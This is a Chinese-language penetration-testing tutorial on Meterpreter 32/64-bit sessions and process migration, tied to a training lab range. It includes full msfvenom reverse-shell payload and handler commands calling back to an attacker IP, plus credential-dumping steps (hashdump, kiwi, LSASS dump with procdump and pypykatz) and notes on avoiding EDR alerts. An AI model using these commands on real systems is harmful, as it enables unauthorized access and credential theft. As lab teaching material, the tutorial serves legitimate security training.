# Meterpreter 架构与 migrate

> 适用场景：已经通过 Metasploit 获得 Meterpreter 会话，需要判断会话是 32 位还是 64 位，以及是否应该执行 `migrate`。
>
> 延伸阅读：[32/64 位会话专题](32-64位会话专题.md) —— 本篇讲「是什么」，那篇讲「生成阶段怎么避开」和「已经上线 32 位怎么补救」。

## 1. Meterpreter 是什么

Meterpreter 是 Metasploit 的后渗透控制会话。

它通常运行在目标进程内存中，由攻击机的 `exploit/multi/handler` 接收连接。进入会话后提示符为：

```text
meterpreter >
```

它可以执行：

- 文件和目录操作
- 进程查看与迁移
- 命令执行
- 凭据读取
- Hash 导出
- 提权尝试
- 端口转发和 SOCKS 代理
- 加载 kiwi、priv、sniffer 等扩展

Meterpreter 不是普通 Shell。需要系统命令行时可以执行：

```text
meterpreter > shell
```

## 2. 32 位会话是什么意思

“Meterpreter 会话是 32 位”指的是：

```text
当前运行的 Meterpreter Payload 是 32 位程序
它正运行在一个 32 位进程中
```

它描述的是 Meterpreter 的程序架构，不是目标 Windows 系统的架构。

例如：

```text
目标系统：Windows 7 x64
Meterpreter：x86/windows
```

这表示：

```text
64 位 Windows
+ 32 位 Meterpreter
= Meterpreter 运行在 WOW64 兼容环境中
```

32 位程序可以运行在 64 位 Windows 上，但访问 64 位进程、模块和系统 API 时会受到限制。

## 3. 如何判断会话架构

查看所有会话：

```text
sessions -l
```

可能显示：

```text
meterpreter x86/windows
meterpreter x64/windows
```

查看 Meterpreter 信息：

```text
meterpreter > sysinfo
```

通常会显示：

```text
Meterpreter : x86/windows
```

或：

```text
Meterpreter : x64/windows
```

查看当前权限：

```text
meterpreter > getuid
```

查看进程架构：

```text
meterpreter > ps
```

`ps` 输出中的 `Arch` 列会显示：

```text
x86
x64
```

## 4. Payload 架构和命名

Metasploit 的 Windows Meterpreter 常见命名如下：

| Payload | 架构 | 类型 |
|---|---|---|
| `windows/meterpreter/reverse_tcp` | x86 | staged |
| `windows/meterpreter_reverse_tcp` | x86 | stageless |
| `windows/x64/meterpreter/reverse_tcp` | x64 | staged |
| `windows/x64/meterpreter_reverse_tcp` | x64 | stageless |

注意：

```text
windows/meterpreter/reverse_tcp
windows/meterpreter_reverse_tcp
```

只差一个斜杠，但前者是 staged，后者是 stageless，不能混用。

生成 32 位 staged Payload：

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.0.111 LPORT=5555 \
  -f exe -o shell_x86.exe
```

生成 64 位 staged Payload：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.0.111 LPORT=5555 \
  -f exe -o shell_x64.exe
```

Handler 必须使用相同的 Payload：

```text
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.111
set lport 5555
set ExitOnSession false
run -j
```

## 5. 为什么很多 WP 先使用 32 位

### 5.1 兼容性更好

32 位 Payload：

```text
可以运行在 32 位 Windows
也可以运行在 64 位 Windows
```

64 位 Payload：

```text
只能运行在 64 位 Windows
不能在 32 位 Windows 上运行
```

如果一开始不确定目标系统架构，32 位 Payload 更保险。

### 5.2 Metasploit 默认示例多是 32 位

很多旧教程和模板使用：

```text
windows/meterpreter/reverse_tcp
```

作者直接复制模板时，经常会先生成 32 位会话，然后再判断是否需要迁移。

### 5.3 先上线再判断环境

常见的后渗透流程是：

```text
先获得 Meterpreter
→ sysinfo / getuid / ps
→ 判断系统架构和权限
→ 决定是否 migrate
```

这种方式比在攻击前猜测目标架构更灵活。

## 6. 32 位会话的限制

32 位 Meterpreter 可能出现：

```text
hashdump 报错
getsystem 超时
load kiwi 失败或功能不完整
无法正常读取 64 位 LSASS 或 SAM
64 位扩展无法加载
```

原因是：

```text
32 位 Meterpreter
→ 只能直接使用 32 位模块
→ 访问 64 位系统进程和 API 受限制
```

如果需要使用 64 位扩展和访问 64 位系统组件，就需要：

1. 重新生成 64 位 Payload；或者
2. 将当前 Meterpreter 迁移到 64 位进程。

## 7. migrate 是什么

`migrate` 的作用是：

```text
把 Meterpreter 注入并迁移到另一个进程
```

命令：

```text
meterpreter > ps
meterpreter > migrate <PID>
meterpreter > getuid
```

它可能带来以下变化：

| 变化 | 说明 |
|---|---|
| 架构变化 | 迁移到 64 位进程后，可能使用 64 位执行环境 |
| 权限变化 | 继承目标进程的用户权限 |
| 稳定性变化 | 迁移到长期运行进程后，会话更稳定 |
| 进程环境变化 | 影响 EDR 和进程级检测行为 |

`migrate` 本身不是提权漏洞。它只是改变 Meterpreter 所在进程；如果目标进程本身是 SYSTEM，迁移后就可能获得 SYSTEM 权限。

## 8. 如何选择迁移进程

先查看：

```text
meterpreter > ps
```

输出示例：

```text
PID   Name         Arch  Session  User
500   svchost.exe  x64   0        NT AUTHORITY\SYSTEM
```

选择原则：

```text
优先 x64
优先 SYSTEM
优先长期稳定进程
与当前会话在同一个 Session
避免关键系统进程和强保护进程
```

常见选择：

- `svchost.exe`
- `winlogon.exe`
- `explorer.exe`

不推荐随意迁移到：

- `lsass.exe` —— **要它的凭据应该 dump 内存，而不是迁进去**
  - lsass 是关键进程，一旦被注入后不稳定，会导致系统蓝屏、会话全丢
  - 现代系统上受 PPL（进程保护），注入多半直接失败
  - 它是 EDR 监控强度最高的进程之一，注入动作极易触发告警
  - 正确姿势：`procdump64.exe -accepteula -ma lsass.exe lsass.dmp`，拷回攻击机用 `pypykatz lsa minidump lsass.dmp` 离线解析
- `csrss.exe`
- `wininit.exe`
- `services.exe`
- 受 EDR 重点保护的进程

迁移前最好确认：

```text
getuid
ps
sysinfo
```

迁移后重新确认：

```text
getuid
sysinfo
```

## 9. migrate 的风险

可能出现：

- PID 选错导致会话丢失。
- 目标进程退出导致新会话断开。
- 注入受保护进程失败。
- 32/64 位不匹配导致迁移失败。
- EDR 检测到进程注入。
- 迁移后原扩展需要重新加载。
- 注入关键进程可能导致目标不稳定。

因此迁移前应记录：

```text
原 PID
原进程名称
原权限
新 PID
新进程名称
新权限
```

## 10. 为什么红日靶场中出现 migrate

红日靶场 2 中：

```text
getsystem 超时
当前 Meterpreter 是 32 位
目标存在 64 位进程
```

因此作者选择：

```text
ps
migrate 500
```

迁移到 PID 500 的 64 位进程后，获得了：

```text
SYSTEM 权限
```

`500` 只是作者环境中的 PID，实际环境必须重新查看 `ps` 后选择。

**这里可以提炼出一条实战结论：**

```text
getsystem 超时
→ 别死磕，先 ps 看有没有 x64 + SYSTEM 的稳定进程
→ 有 → migrate 过去，权限直接继承
→ 没有 → 再考虑内核漏洞等其他提权路径
```

`getsystem` 超时的常见原因，正是 32 位会话访问不了 64 位的 SYSTEM token；而 migrate 到 64 位 SYSTEM 进程后，权限是**继承**来的——等于绕过了 `getsystem`。靶场 2 就是这个案例。

## 11. 更推荐的方式

如果已经确认目标为 64 位 Windows，直接从生成阶段使用 x64 Payload：

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.0.111 LPORT=5555 \
  -f exe -o shell_x64.exe
```

Handler 保持一致：

```text
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.111
set lport 5555
set ExitOnSession false
run -j
```

这样通常可以避免因 32/64 位不匹配导致的 `hashdump`、`kiwi` 和扩展加载问题。

即使使用 x64 Payload，仍然可能为了权限和稳定性执行 `migrate`，但不再是必须为了切换架构而迁移。

## 12. 常见错误

### 12.1 Payload 和 Handler 不一致

错误示例：

```text
生成：windows/meterpreter_reverse_tcp
监听：windows/x64/meterpreter/reverse_tcp
```

原因：

```text
x86 stageless
与
x64 staged
不匹配
```

### 12.2 把 staged 和 stageless 混用

```text
windows/meterpreter/reverse_tcp
windows/meterpreter_reverse_tcp
```

两者不是同一个 Payload。

### 12.3 直接复制别人的 PID

```text
migrate 500
```

只适用于文章作者的环境，实际必须重新执行：

```text
ps
```

### 12.4 认为 migrate 等于提权

`migrate` 只是改变宿主进程。是否能获得 SYSTEM，取决于目标进程本身的权限。

## 13. 快速判断流程

```text
获得 Meterpreter
→ sessions -l / sysinfo
→ 判断 x86 还是 x64
→ getuid 判断当前权限
→ ps 查找合适的 x64 / SYSTEM 进程
→ 必要时 migrate <PID>
→ getuid 重新确认权限
→ load kiwi / hashdump / creds_all
```

## 14. 一句话总结

```text
Meterpreter 32 位
= 32 位 Payload 运行在 32 位进程或 WOW64 环境
= 访问 64 位系统组件和扩展受限

migrate
= 将 Meterpreter 转移到另一个进程
= 用于改变架构、权限和稳定性
= 不是提权漏洞

已知目标是 64 位时，
最好从生成 Payload 阶段就直接使用 windows/x64/meterpreter/reverse_tcp。
```